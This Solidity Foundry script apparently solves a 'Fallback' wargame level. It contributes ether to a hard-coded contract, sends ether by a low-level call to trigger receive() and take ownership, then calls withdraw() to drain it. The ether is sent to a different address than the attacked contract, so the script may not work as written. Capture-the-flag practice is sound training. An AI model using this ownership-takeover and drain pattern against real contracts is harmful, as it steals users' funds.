// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {AttackFallback} from "../src/AttackFallback.sol";

contract StopScript is Script {
    
    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IExpose attack = IExpose(0xAd6E408e50b3df65E6036f868902EAD97ae17b43);

        // vm.deal(address(attack),0.001 ether);
        attack.contribute{value: 0.0001 ether}();
        attack.getContribution();

        // bacause,businecc logical in the receive(),if use send or transfer to send the ether,it will be out of gas.
        payable(0xd7dbCDF0Efc84fD1362C626d75Ea7de74703AF23).call{value: 0.00001 ether}("");
        attack.withdraw();

        vm.stopBroadcast();
    }
}


interface IExpose {
    function contribute() external payable;

    function getContribution() external view returns (uint);

    function withdraw() external;
}
